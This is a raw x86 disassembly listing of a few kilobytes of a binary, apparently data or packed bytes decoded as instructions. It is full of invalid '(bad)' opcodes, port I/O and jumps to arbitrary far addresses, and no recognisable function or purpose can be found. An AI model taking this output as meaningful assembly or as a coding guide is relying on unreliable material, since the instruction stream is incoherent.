  420e51:	sub    al,0xf9
  420e53:	int    0xa
  420e55:	ins    DWORD PTR es:[edi],dx
  420e56:	(bad)  
  420e57:	sbb    dl,ah
  420e59:	jmp    FWORD PTR [ecx+0x2]
  420e5c:	stos   DWORD PTR es:[edi],eax
  420e5d:	mov    bh,0xbd
  420e5f:	inc    esp
  420e60:	cmp    DWORD PTR [ebp-0xe862624],edi
  420e66:	in     eax,dx
  420e67:	xchg   esp,eax
  420e68:	outs   dx,DWORD PTR ds:[esi]
  420e69:	sub    BYTE PTR [ebx+edx*1-0x67abfdb],bl
  420e70:	fadd   DWORD PTR [ebp+0x174a894c]
  420e76:	push   ds
  420e77:	shl    DWORD PTR [ebx+0x67],1
  420e7a:	bound  edi,QWORD PTR [ecx+ecx*2-0x18]
  420e7e:	xchg   esi,eax
  420e7f:	scas   eax,DWORD PTR es:[edi]
  420e80:	xor    dh,BYTE PTR [esi]
  420e82:	xchg   edx,eax
  420e83:	sbb    dl,dl
  420e85:	inc    ebx
  420e86:	jg     0x420e5e
  420e88:	adc    bl,BYTE PTR fs:[edi-0x2d26e757]
  420e8f:	sbb    dl,ch
  420e91:	add    DWORD PTR [ebx],ebp
  420e93:	xor    DWORD PTR [edi],ebx
  420e95:	cld    
  420e96:	out    dx,eax
  420e97:	adc    DWORD PTR ds:0xfc00adf9,eax
  420e9d:	xchg   ebx,eax
  420e9e:	mov    ebp,0xe4af3909
  420ea3:	lods   eax,DWORD PTR ds:[esi]
  420ea4:	and    bl,BYTE PTR [eax+0x73]
  420ea7:	out    dx,al
  420ea8:	cs (bad) 
  420eaa:	pop    ebp
  420eab:	jo     0x420ed6
  420ead:	or     eax,0xd8145c25
  420eb2:	pop    ss
  420eb3:	sahf   
  420eb4:	and    al,0xfe
  420eb6:	xor    eax,0x332e5840
  420ebb:	push   esp
  420ebc:	clc    
  420ebd:	fsubr  DWORD PTR [ebp+0xb34898]
  420ec3:	add    BYTE PTR [eax],al
  420ec5:	add    BYTE PTR [eax],al
  420ec7:	add    BYTE PTR [eax],al
  420ec9:	add    BYTE PTR [ebp+0x48],dl
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     bl,BYTE PTR ds:0xd0349fa6
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	add    BYTE PTR [esi],0x0
  420ee1:	add    BYTE PTR [esp+edx*8],ah
  420ee4:	test   DWORD PTR [ecx],edx
  420ee6:	mov    fs,WORD PTR [ecx-0x12d2d222]
  420eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eed:	add    esi,ebx
  420eef:	and    al,0x7
  420ef1:	inc    ebx
  420ef2:	hlt    
  420ef3:	(bad)  
  420ef4:	scas   eax,DWORD PTR es:[edi]
  420ef5:	pop    ebp
  420ef6:	stos   DWORD PTR es:[edi],eax
  420ef7:	popf   
  420ef8:	les    ebx,FWORD PTR [eax-0x1a]
  420efb:	inc    esi
  420efc:	outs   dx,DWORD PTR ds:[esi]
  420efd:	cdq    
  420efe:	adc    eax,0x22b58367
  420f03:	sbb    eax,0x92e7b91e
  420f08:	(bad)  
  420f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f0a:	mov    edi,ebp
  420f0c:	fadd   st,st(5)
  420f0e:	fbld   TBYTE PTR [esi-0x68]
  420f11:	dec    eax
  420f12:	push   esp
  420f13:	pusha  
  420f14:	test   eax,0xb6202617
  420f19:	ds ss inc esp
  420f1c:	add    BYTE PTR [eax-0x2b],ch
  420f1f:	jle    0x420eae
  420f21:	pop    ds
  420f22:	imul   esp,ebp,0x4e
  420f25:	and    DWORD PTR [ecx],esi
  420f27:	les    ebp,FWORD PTR [ecx+0x797a06e7]
  420f2d:	adc    eax,0x2283e65
  420f32:	mov    al,0xe4
  420f34:	dec    eax
  420f35:	push   ecx
  420f37:	sbb    eax,0x8e44b6c0
  420f3c:	mov    bl,0x54
  420f3e:	mov    bh,dh
  420f40:	sub    eax,DWORD PTR ds:0xea85d1bf
  420f46:	fadd   DWORD PTR [ebp+0x4ca67d97]
  420f4c:	in     al,dx
  420f4d:	sub    esp,esi
  420f4f:	and    al,0x7e
  420f51:	pop    es
  420f52:	jnp    0x420efb
  420f54:	push   0xc23f101f
  420f59:	or     DWORD PTR [esi+eax*8-0x7b],0xffffffef
  420f5e:	bound  esp,QWORD PTR [edx+0x60]
  420f61:	dec    ebx
  420f62:	mov    edx,0x5bec76fd
  420f67:	add    eax,0x59657081
  420f6c:	or     bl,BYTE PTR [edx-0x5aa6f6c1]
  420f72:	sti    
  420f73:	lahf   
  420f74:	dec    edx
  420f75:	shl    edx,1
  420f77:	sub    ch,BYTE PTR [edi-0x59]
  420f7a:	retf   
  420f7b:	mov    al,0x69
  420f7d:	loop   0x420fbd
  420f7f:	or     DWORD PTR [ecx+0x54c1b4b1],esi
  420f85:	push   esp
  420f86:	lea    esp,[edx+ebx*2+0x37]
  420f8a:	dec    ebp
  420f8b:	fmul   DWORD PTR [edi+0x6c]
  420f8e:	pop    esp
  420f8f:	cld    
  420f90:	mov    eax,0x68baa910
  420f95:	sbb    eax,0xa383a782
  420f9a:	mov    ch,0xb7
  420f9c:	jnp    0x420f22
  420f9e:	jmp    esp
  420fa0:	mov    WORD PTR [ebx+0xe],?
  420fa3:	sti    
  420fa4:	fdivr  DWORD PTR [edi-0x68cd4df9]
  420faa:	inc    ebp
  420fab:	add    eax,0x796ee95f
  420fb0:	jnp    0x420fc4
  420fb2:	pop    edi
  420fb3:	or     edx,esp
  420fb5:	pop    edx
  420fb6:	ja     0x420f9e
  420fb8:	jne    0x420f58
  420fba:	xor    al,0xa8
  420fbc:	mov    esp,0xc8c5ae98
  420fc1:	fisub  WORD PTR [esi-0x1b287a5f]
  420fc7:	jl     0x420fed
  420fc9:	push   edi
  420fca:	adc    DWORD PTR [eax],0x4bb5bdfe
  420fd0:	enter  0x6d5e,0x4e
  420fd4:	std    
  420fd5:	rcl    DWORD PTR [edx],cl
  420fd7:	dec    ecx
  420fd8:	push   es
  420fd9:	dec    ebx
  420fda:	stc    
  420fdb:	and    cl,al
  420fdd:	adc    BYTE PTR [edx],0xf9
  420fe0:	xchg   BYTE PTR [esi-0x2d],bl
  420fe3:	scas   al,BYTE PTR es:[edi]
  420fe4:	push   esi
  420fe5:	mov    al,ds:0xf0f192a6
  420fea:	push   esi
  420feb:	mov    dl,0x32
  420fed:	mov    edi,0x32fb4557
  420ff2:	mov    ebx,0x82b4c93c
  420ff7:	stc    
  420ff8:	scas   al,BYTE PTR es:[edi]
  420ff9:	push   cs
  420ffa:	xchg   edx,esi
  420ffc:	sbb    eax,0x801a9cc9
  421001:	inc    ebx
  421002:	fsub   QWORD PTR [ecx+0x535ffb4b]
  421008:	sbb    al,0xc2
  42100a:	push   esp
  42100b:	lea    eax,[eax-0x706c8b1e]
  421011:	fs push ecx
  421013:	push   ecx
  421014:	inc    ebx
  421015:	push   edx
  421016:	lock sbb eax,0xbeda7178
  42101c:	mov    ds:0x338be4af,al
  421021:	and    esp,ecx
  421023:	xor    BYTE PTR ds:0xed827c0c,ch
  421029:	pop    edx
  42102a:	(bad)  
  42102b:	lods   eax,DWORD PTR ds:[esi]
  42102c:	push   eax
  42102d:	cmp    eax,esp
  42102f:	jo     0x421047
  421031:	das    
  421032:	and    ch,bl
  421034:	jbe    0x420ff5
  421036:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  421038:	and    BYTE PTR [ebx+0x475a54a2],cl
  42103e:	add    DWORD PTR [ebp+0x1720feb8],edi
  421044:	ja     0x42108d
  421046:	adc    DWORD PTR [esi+0x38dd8512],esp
  42104c:	iret   
  42104d:	xor    ebx,0x383290c
  421053:	push   esi
  421054:	mov    ecx,0x2f692cc1
  421059:	in     al,dx
  42105a:	popf   
  42105b:	arpl   sp,bp
  42105d:	adc    WORD PTR [esi],0x78
  421061:	aas    
  421062:	leave  
  421063:	push   edi
  421064:	sbb    DWORD PTR [esi-0x25f7af45],ebp
  42106a:	dec    ecx
  42106b:	pop    eax
  42106c:	xchg   bh,dh
  42106e:	je     0x42108d
  421070:	xchg   ebx,eax
  421071:	xchg   ebp,eax
  421072:	push   ecx
  421073:	in     eax,0xed
  421075:	pop    esp
  421076:	daa    
  421077:	fild   WORD PTR [ebx+esi*2-0x1c]
  42107b:	pop    esi
  42107c:	daa    
  42107d:	pop    esi
  42107e:	push   ss
  42107f:	sbb    al,0xa7
  421081:	repz mov ds:0xbc08c493,al
  421087:	lods   eax,DWORD PTR ds:[esi]
  421088:	lds    eax,FWORD PTR [eax-0x6c]
  42108b:	mov    dh,BYTE PTR [eax+0x1]
  42108e:	jbe    0x421028
  421090:	neg    DWORD PTR [eax]
  421092:	call   0xf72f9413
  421097:	pop    es
  421098:	repz dec esp
  42109a:	fisttp DWORD PTR [ecx+0x6242a8f8]
  4210a0:	shr    DWORD PTR [edi],1
  4210a2:	lods   eax,DWORD PTR ds:[esi]
  4210a3:	and    dh,BYTE PTR [esi-0x3fb92e8]
  4210a9:	jge    0x4210b8
  4210ab:	sbb    dh,dh
  4210ad:	leave  
  4210ae:	ss jae 0x4210b3
  4210b1:	test   DWORD PTR [edi],edi
  4210b3:	fld    TBYTE PTR [esi-0x39bbaecb]
  4210b9:	push   ecx
  4210ba:	xlat   BYTE PTR ds:[ebx]
  4210bb:	cwde   
  4210bc:	aaa    
  4210bd:	scas   eax,DWORD PTR es:[edi]
  4210be:	or     DWORD PTR [eax+0x54cb9231],0x617e5af0
  4210c8:	fldcw  WORD PTR [ebx+ebx*1+0x73544e17]
  4210cf:	xchg   ebx,eax
  4210d0:	in     eax,0x44
  4210d2:	or     ch,BYTE PTR [esi-0x742ba6cf]
  4210d8:	xchg   edx,eax
  4210d9:	xchg   ecx,eax
  4210da:	scas   al,BYTE PTR es:[edi]
  4210db:	push   es
  4210dc:	sub    al,0xc2
  4210de:	mov    ecx,DWORD PTR [eax+esi*4]
  4210e1:	dec    edi
  4210e2:	fcom   st(4)
  4210e4:	sub    BYTE PTR [edi-0x2187dbe2],al
  4210ea:	hlt    
  4210eb:	pop    esp
  4210ec:	mov    edx,0xad046341
  4210f1:	xor    al,0x3e
  4210f3:	xchg   ebx,eax
  4210f4:	mov    ah,BYTE PTR [ebx]
  4210f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210f7:	xchg   DWORD PTR [esi],eax
  4210f9:	jmp    0x4210cd
  4210fb:	mov    esi,0x4e97d92a
  421100:	mov    ecx,0xe59e7049
  421105:	shr    DWORD PTR [ecx-0x2c],cl
  421108:	jl     0x4210cc
  42110a:	push   0x3790920d
  42110f:	push   es
  421110:	xor    al,BYTE PTR [edi-0x659a00a9]
  421116:	pop    ds
  421117:	sub    dl,BYTE PTR [eax+ecx*1-0x40]
  42111b:	in     eax,dx
  42111c:	push   ecx
  42111d:	adc    DWORD PTR [eax-0x4e],edx
  421120:	pop    DWORD PTR [edx-0x12]
  421123:	mov    dl,0xb7
  421125:	fs or  al,0x5f
  421128:	push   0xffffffdb
  42112a:	mov    ecx,0x996dc15b
  42112f:	add    al,0x1c
  421131:	xor    bh,cl
  421133:	or     DWORD PTR [eax-0x2094aaa3],edx
  421139:	(bad)  
  42113a:	stc    
  42113b:	imul   ecx,edx,0xffffffcb
  42113e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42113f:	data16 adc BYTE PTR gs:[esi-0x66fa759a],cl
  421147:	sbb    al,0x29
  421149:	inc    ecx
  42114a:	xor    DWORD PTR [edi+edx*8+0x328aa492],eax
  421151:	mov    esi,0xd8418d87
  421156:	add    eax,0xdcd0ac0b
  42115b:	jnp    0x421121
  42115d:	clc    
  42115e:	out    0x90,al
  421160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421161:	into   
  421162:	pop    esp
  421163:	adc    bh,BYTE PTR [ebx+ebp*2-0x4b]
  421167:	ja     0x421150
  421169:	sbb    eax,0xe970d170
  42116e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42116f:	cs stc 
  421171:	or     DWORD PTR [ebp+0x5d2c0f4],0x4558eb1b
  42117b:	sub    eax,0x8dfc9b43
  421180:	cdq    
  421181:	xchg   edx,eax
  421182:	bound  ebp,QWORD PTR [ebx-0x5a946126]
  421188:	inc    eax
  421189:	inc    esp
  42118a:	fcmovb st,st(4)
  42118c:	cmp    edx,DWORD PTR [esi-0x7e16710a]
  421192:	repnz cmovg ecx,ecx
  421196:	mov    ebx,DWORD PTR [edx+0x27]
  421199:	into   
  42119a:	std    
  42119b:	mov    esi,0xeff679a
  4211a0:	imul   BYTE PTR [esi-0x3a80da4f]
  4211a6:	cmp    esp,DWORD PTR [ecx]
  4211a8:	repz or al,0xf
  4211ab:	sub    esi,DWORD PTR [eax]
  4211ad:	mov    ch,0x76
  4211af:	mov    al,ds:0x69e31bdc
  4211b4:	sub    eax,0xd686987c
  4211b9:	fsubr  QWORD PTR [ecx+eiz*8+0x5c]
  4211bd:	les    ebp,FWORD PTR [ebp+edx*8+0x7bf44239]
  4211c4:	adc    DWORD PTR [ebx-0x7165764],edx
  4211ca:	push   es
  4211cb:	in     al,dx
  4211cc:	mov    BYTE PTR [eax+0x6c],ah
  4211cf:	xchg   ebp,eax
  4211d0:	dec    ecx
  4211d1:	cmp    BYTE PTR [edx+0x18],0xfe
  4211d5:	lock call 0xfd78:0x45b3ed1f
  4211dd:	add    edx,DWORD PTR ds:0xc9c6a1e7
  4211e3:	sbb    DWORD PTR [esi],ebx
  4211e5:	pushf  
  4211e6:	daa    
  4211e7:	in     eax,0x30
  4211e9:	sbb    DWORD PTR [edi],0xd4c38ccd
  4211ef:	fadd   QWORD PTR [edx]
  4211f1:	cs scas eax,DWORD PTR es:[edi]
  4211f3:	mov    bl,0x6a
  4211f5:	les    eax,FWORD PTR [ecx]
  4211f7:	mov    WORD PTR [ebp+ecx*4+0xb],?
  4211fb:	jno    0x4211cf
  4211fd:	cs jle 0x4211f6
  421200:	mov    esi,0x3776b30
  421205:	jmp    0x1157:0x88984ee8
  42120c:	in     al,0xb9
  42120e:	xlat   BYTE PTR ds:[ebx]
  42120f:	shl    BYTE PTR [ebp-0x51],1
  421212:	push   ebx
  421213:	mov    edi,0xcaa127e0
  421218:	inc    edx
  421219:	std    
  42121a:	inc    edx
  42121b:	mov    bl,dl
  42121d:	xchg   esp,eax
  42121e:	shl    DWORD PTR [ebx-0x4a],0xba
  421222:	aas    
  421223:	lods   al,BYTE PTR ds:[esi]
  421224:	push   edi
  421225:	out    0xbd,eax
  421227:	mov    eax,ds:0x2cbcedef
  42122c:	inc    eax
  42122d:	gs leave 
  42122f:	leave  
  421230:	jle    0x4211dd
  421232:	pop    ss
  421233:	repnz sbb al,0x47
  421236:	fs or  eax,edx
  421239:	mov    ebx,0x874b00fb
  42123e:	dec    esi
  42123f:	mov    ds:0xd4761d7d,eax
  421244:	push   ebp
  421245:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421247:	stos   BYTE PTR es:[edi],al
  421248:	jbe    0x42121e
  42124a:	push   eax
  42124b:	sub    ch,dh
  42124d:	mov    es,WORD PTR [edi]
  42124f:	aam    0x15
  421251:	inc    esp
  421252:	cdq    
  421253:	sub    esi,DWORD PTR cs:[eax+0x36bdf739]
  42125a:	popa   
  42125b:	inc    ebp
  42125c:	shl    DWORD PTR [ebx+0x730f3dd4],1
  421262:	xchg   ebx,eax
  421263:	mov    DWORD PTR [ecx-0x5eb63118],ebx
  421269:	fs inc esp
  42126b:	add    esi,DWORD PTR [esi+edi*4]
  42126e:	ins    DWORD PTR es:[edi],dx
  42126f:	sbb    eax,0xa5957dc6
  421274:	aas    
  421275:	push   0x943fed4a
  42127a:	jecxz  0x4212bd
  42127c:	das    
  42127d:	pop    edi
  42127e:	xchg   edi,eax
  42127f:	stc    
  421280:	(bad)  
  421281:	sbb    DWORD PTR [ebx+0x707ce4c0],eax
  421287:	test   BYTE PTR [ecx+0x37],bl
  42128a:	cmp    BYTE PTR [edx+0x4a],ah
  42128d:	aad    0x32
  42128f:	sbb    dh,BYTE PTR [edx+edi*8]
  421292:	mov    ds:0xaae9b5f7,eax
  421297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421298:	pop    esi
  421299:	cdq    
  42129a:	stos   BYTE PTR es:[edi],al
  42129b:	jl     0x4212c7
  42129d:	cmp    ah,BYTE PTR [ecx]
  42129f:	jle    0x421234
  4212a1:	dec    esp
  4212a2:	jg     0x421298
  4212a4:	mov    BYTE PTR [ebx+ebx*4-0x7],ah
  4212a8:	xchg   esi,eax
  4212a9:	push   esi
  4212aa:	sub    eax,edi
  4212ac:	pop    eax
  4212ad:	into   
  4212ae:	xchg   esi,eax
  4212af:	cli    
  4212b0:	inc    edx
  4212b1:	fbstp  TBYTE PTR [ecx+0x52effddf]
  4212b7:	sub    al,0x7a
  4212b9:	sbb    ebp,DWORD PTR [esi-0x1a19147]
  4212bf:	xor    BYTE PTR [esi+ecx*4+0x3f09347],dh
  4212c6:	push   es
  4212c7:	outs   dx,BYTE PTR ds:[esi]
  4212c8:	(bad)  
  4212c9:	and    al,0xb1
  4212cb:	jne    0x421252
  4212cd:	pop    esp
  4212ce:	pop    esi
  4212cf:	sub    al,0x28
  4212d1:	or     DWORD PTR [esi],esp
  4212d3:	lods   al,BYTE PTR ds:[esi]
  4212d4:	ins    DWORD PTR es:[edi],dx
  4212d5:	inc    edx
  4212d6:	pop    ss
  4212d7:	and    dl,0xc6
  4212da:	pop    es
  4212db:	mov    ah,0x7e
  4212dd:	add    bh,BYTE PTR [eax]
  4212df:	ret    
  4212e0:	xchg   ebp,eax
  4212e1:	inc    esi
  4212e2:	dec    ecx
  4212e3:	or     ebx,DWORD PTR [edi]
  4212e5:	cmc    
  4212e6:	enter  0xe6e9,0xcf
  4212ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212eb:	add    DWORD PTR [ebp-0x44b6c649],edx
  4212f1:	jno    0x4212ce
  4212f3:	pop    edx
  4212f4:	loop   0x42128b
  4212f6:	jg     0x7cf4ba77
  4212fc:	sub    eax,0x224984e5
  421301:	dec    ebp
  421302:	das    
  421303:	outs   dx,BYTE PTR ds:[esi]
  421304:	cmp    ebx,DWORD PTR [eax]
  421306:	pop    ds
  421307:	xor    al,0x78
  421309:	inc    ecx
  42130a:	mov    ebp,0xe8bd4599
  42130f:	inc    ebp
  421310:	test   BYTE PTR [eax],0x3d
  421313:	xchg   ecx,eax
  421314:	aam    0xb5
  421316:	push   0x922c98a9
  42131b:	mov    es,WORD PTR [ebx]
  42131d:	fdivr  DWORD PTR [edx+ecx*4+0x7d15667a]
  421324:	pop    eax
  421325:	cwde   
  421326:	mov    esp,0xc96be8f9
  42132b:	add    DWORD PTR [esi+0x4beddf4],0x28fc553
  421335:	dec    edi
  421336:	arpl   WORD PTR [edi],bp
  421338:	nop
  421339:	xor    DWORD PTR [esp+ecx*4],edi
  42133c:	adc    al,0x64
  42133e:	neg    DWORD PTR [ebp-0x10]
  421341:	inc    ecx
  421342:	mov    BYTE PTR ds:0xacbc288b,al
  421348:	ret    
  421349:	mov    WORD PTR [esp+edi*2+0x607ed562],es
  421350:	std    
  421351:	push   eax
  421352:	push   ebx
  421353:	int3   
  421354:	or     cl,dl
  421356:	mov    BYTE PTR [edi],cl
  421358:	out    dx,al
  421359:	pop    esi
  42135a:	push   ebx
  42135b:	fcmovb st,st(4)
  42135d:	xchg   DWORD PTR [ecx+eiz*2],eax
  421360:	(bad)  
  421362:	fs jle 0x42135d
  421365:	aad    0xee
  421367:	or     eax,DWORD PTR [esi]
  421369:	push   es
  42136a:	fistp  QWORD PTR [esp+ecx*2-0x4a51d463]
  421371:	jecxz  0x42136a
  421373:	cmp    DWORD PTR [ecx],ebp
  421375:	rol    eax,cl
  421377:	(bad)  
  421379:	pop    ebx
  42137a:	jle    0x421355
  42137c:	sbb    eax,0x1a8699d6
  421381:	retf   
  421382:	sbb    DWORD PTR [eax],edx
  421384:	cmp    BYTE PTR ds:0xe3e22c27,bh
  42138a:	xor    cl,al
  42138c:	cwde   
  42138d:	add    DWORD PTR [eax+ebx*1+0x5a],edx
  421391:	nop
  421392:	dec    esp
  421393:	or     DWORD PTR [edi+0x72],esp
  421396:	loopne 0x42139b
  421398:	lock es inc esp
  42139b:	add    cl,ah
  42139d:	shl    DWORD PTR [edi],1
  42139f:	dec    ebp
  4213a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a2:	adc    bh,dl
  4213a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213a5:	mov    cl,BYTE PTR [ebx]
  4213a7:	lea    edi,[edx-0x742be308]
  4213ad:	xor    al,0xe8
  4213af:	push   es
  4213b0:	daa    
  4213b1:	mov    bh,0x9f
  4213b3:	xor    al,0xd0
  4213b5:	rcl    DWORD PTR [esi+ebp*8],cl
  4213b8:	aam    0x26
  4213ba:	cmp    BYTE PTR [ecx-0x6968c1d0],0x5e
  4213c1:	xlat   BYTE PTR ds:[ebx]
  4213c2:	dec    esi
  4213c3:	jne    0x421415
  4213c5:	into   
  4213c6:	in     al,0xde
  4213c8:	outs   dx,DWORD PTR ds:[esi]
  4213c9:	test   BYTE PTR [ebx],ch
  4213cb:	mov    ds,edx
  4213cd:	mov    eax,ds:0x82186fdb
  4213d2:	add    al,BYTE PTR [edi-0x13]
  4213d5:	(bad)  
  4213d6:	je     0x421444
  4213d8:	add    al,0xe4
  4213da:	cmp    edi,ecx
  4213dc:	test   DWORD PTR [edx],edx
  4213de:	cmp    BYTE PTR [edx],0xf4
  4213e1:	and    bh,BYTE PTR [edi-0x6d]
  4213e4:	add    DWORD PTR [edi+0x5bcdb76d],ebp
  4213ea:	mov    ch,0x71
  4213ec:	mov    ah,0x86
  4213ee:	dec    ecx
  4213ef:	and    esi,0x3126b22a
  4213f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213f6:	jl     0x421394
  4213f8:	div    DWORD PTR [esi]
  4213fa:	fwait
  4213fb:	add    BYTE PTR [edx],al
  4213fd:	outs   dx,DWORD PTR ds:[esi]
  4213fe:	dec    ebx
  4213ff:	enter  0x6073,0x48
  421403:	(bad)  
  421404:	bound  esi,QWORD PTR [edx-0x5a832ad]
  42140a:	(bad)  
  42140b:	pop    esi
  42140c:	fisubr DWORD PTR [ebx]
  42140e:	xor    ah,cl
  421410:	inc    DWORD PTR [ecx]
  421412:	sahf   
  421413:	cmp    al,0x31
  421415:	sbb    DWORD PTR [ebx+0x2b832c4f],ebx
  42141b:	push   edx
  42141c:	daa    
  42141d:	in     eax,0xaf
  42141f:	push   edx
  421420:	dec    edi
  421421:	outs   dx,DWORD PTR ds:[esi]
  421422:	das    
  421423:	aas    
  421424:	or     dl,bl
  421426:	jns    0x4213ae
  421428:	int    0x71
  42142a:	push   es
  42142b:	mov    dl,0xbf
  42142d:	push   esi
  42142e:	call   0xe7c0:0xbc1c3bbd
  421435:	shl    BYTE PTR [eax],cl
  421437:	and    edi,DWORD PTR [eax]
  421439:	xchg   BYTE PTR ds:0xbe43895c,dh
  42143f:	pop    eax
  421440:	das    
  421441:	add    BYTE PTR [edx-0x2d],ch
  421444:	mov    ch,0x18
  421446:	dec    ebp
  421447:	les    esp,FWORD PTR [edx+0x527432e5]
  42144d:	mov    eax,ds:0x5cddbdab
  421452:	fisub  DWORD PTR [ecx+0x61]
  421455:	mov    dh,0xde
  421457:	shr    ah,1
  421459:	test   al,0xf7
  42145b:	xchg   bh,bh
  42145d:	in     al,dx
  42145e:	jecxz  0x421448
  421460:	push   ecx
  421461:	outs   dx,BYTE PTR es:[esi]
  421463:	sub    dh,BYTE PTR [ebx]
  421465:	xor    BYTE PTR [edi],0xe0
  421468:	pop    ss
  421469:	int    0xd9
  42146b:	push   esi
  42146c:	cs dec ebp
  42146e:	add    ch,dh
  421470:	xchg   ebp,eax
  421471:	in     eax,0xed
  421473:	fistp  DWORD PTR [esi]
  421475:	mov    ds:0xd626ef63,eax
  42147a:	nop
  42147b:	add    eax,0xec0bd639
  421480:	(bad)  
  421482:	shl    DWORD PTR [esi+0x18],cl
  421485:	pushf  
  421486:	outs   dx,BYTE PTR ds:[esi]
  421487:	outs   dx,DWORD PTR ds:[esi]
  421488:	sbb    eax,0x2b2c3493
  42148d:	mov    ebp,0x91138163
  421492:	(bad)  
  421493:	lea    edx,[ecx+eiz*8-0x6e40a1e7]
  42149a:	dec    eax
  42149b:	jp     0x4214d7
  42149d:	inc    ch
  42149f:	sub    dl,dh
  4214a1:	aad    0x60
  4214a3:	fs mov edx,0xa503064
  4214a9:	mov    ebp,0x1c275131
  4214ae:	jae    0x421489
  4214b0:	outs   dx,BYTE PTR ds:[esi]
  4214b1:	or     al,0x51
  4214b3:	lods   eax,DWORD PTR ds:[esi]
  4214b4:	out    0x24,al
  4214b6:	dec    bh
  4214b8:	dec    esi
  4214b9:	aas    
  4214ba:	loop   0x421457
  4214bc:	fnstcw WORD PTR [edx]
  4214be:	ins    DWORD PTR es:[edi],dx
  4214bf:	sbb    edx,edx
  4214c1:	js     0x42149b
  4214c3:	mov    WORD PTR [ecx+0x1a],gs
  4214c6:	mov    esi,0x9356b539
  4214cb:	push   edi
  4214cc:	pop    eax
  4214cd:	(bad)  
  4214ce:	fsubr  DWORD PTR [ecx+0x6919df3d]
  4214d4:	in     eax,0x44
  4214d6:	call   0x9f67e17c
  4214db:	repnz cwde 
  4214dd:	pop    ebx
  4214de:	and    ch,dl
  4214e0:	inc    ebp
  4214e1:	int3   
  4214e2:	xchg   esp,eax
  4214e3:	xchg   ecx,eax
  4214e4:	add    BYTE PTR [edi],cl
  4214e6:	scas   eax,DWORD PTR es:[edi]
  4214e7:	or     eax,0xf6072802
  4214ec:	pop    ecx
  4214ed:	xlat   BYTE PTR ds:[ebx]
  4214ee:	and    eax,0x1e0bfdc3
  4214f3:	cmp    BYTE PTR [edi+0x1ec6299a],bh
  4214f9:	(bad)  
  4214fa:	in     al,0xc5
  4214fc:	in     eax,0xc2
  4214fe:	test   edi,esp
  421500:	adc    dl,BYTE PTR [ebp-0x7]
  421503:	mov    ch,BYTE PTR [esi]
  421505:	leave  
  421506:	dec    edx
  421507:	mov    eax,DWORD PTR [ebx-0x724ed7bc]
  42150d:	mov    cl,BYTE PTR [eax]
  42150f:	adc    DWORD PTR [ebx],ebx
  421511:	(bad)  
  421513:	mov    eax,ds:0xf15afcf1
  421518:	jmp    0xe90385bd
  42151d:	fldenv [esi-0x73]
  421520:	mov    BYTE PTR [edi-0x46d16ca1],ah
  421526:	push   edi
  421527:	cmp    bl,BYTE PTR [edx+0x710cf5ff]
  42152d:	test   BYTE PTR [ebx],al
  42152f:	cmp    edi,DWORD PTR [esi]
  421531:	fild   QWORD PTR [eax+0x1cc36ac7]
  421537:	mov    bl,0x3f
  421539:	int    0xf2
  42153b:	xor    al,0x27
  42153d:	jo     0x421534
  42153f:	mov    BYTE PTR [edx-0x7b],0xda
  421543:	fwait
  421544:	push   esp
  421545:	pop    ebp
  421546:	loop   0x42153a
  421548:	lods   eax,DWORD PTR ds:[esi]
  421549:	(bad)  
  42154a:	jns    0x421525
  42154c:	scas   al,BYTE PTR es:[edi]
  42154d:	mov    ds:0xb054dffd,eax
  421552:	popf   
  421553:	adc    BYTE PTR [ecx-0x2c],dl
  421556:	and    eax,0xa6104cca
  42155b:	sub    edx,DWORD PTR [esi+0x14]
  42155e:	or     DWORD PTR [edx-0x4d],0x12
	...
  42156a:	push   edi
  42156b:	pop    edx
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x24517db5
  421579:	jnp    0x4215cb
  42157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42157c:	add    DWORD PTR [eax],eax
  42157e:	add    BYTE PTR [esi],0x0
  421581:	add    dh,dl
  421583:	xchg   esp,eax
  421584:	ret    
  421585:	mov    WORD PTR [ebx+0x561a97af],?
  42158b:	mov    dl,0x52
  42158d:	dec    ecx
  42158e:	stos   BYTE PTR es:[edi],al
  42158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421590:	sbb    ecx,ebp
  421592:	push   ebp
  421593:	jne    0x421614
  421595:	imul   esi,DWORD PTR [ebp-0x5],0x539cbadc
  42159c:	stos   DWORD PTR es:[edi],eax
  42159d:	sub    eax,DWORD PTR [ecx-0x65]
  4215a0:	sub    eax,0x67a402eb
  4215a5:	sub    BYTE PTR [ebp+0x30c52e2b],cl
  4215ab:	call   0x474e53c
  4215b0:	mov    eax,0x508cbde7
  4215b5:	jmp    0xe1b1:0xaec90fa
  4215bc:	jns    0x42160b
  4215be:	mov    al,ds:0xc4c35bed
  4215c3:	inc    edi
  4215c4:	cwde   
  4215c5:	sbb    esp,edi
  4215c7:	es cmp edx,ebx
  4215ca:	mov    bh,0x72
  4215cc:	into   
  4215cd:	outs   dx,BYTE PTR ds:[esi]
  4215ce:	xor    edi,DWORD PTR [ecx+0x34]
  4215d1:	pusha  
  4215d2:	in     al,0xb2
  4215d4:	cld    
  4215d5:	add    edi,DWORD PTR [edi-0x39]
  4215d8:	or     DWORD PTR [edi+0x78eddad9],esp
  4215de:	and    eax,esp
  4215e0:	inc    esi
  4215e1:	lock sbb DWORD PTR [eax-0x75],ebp
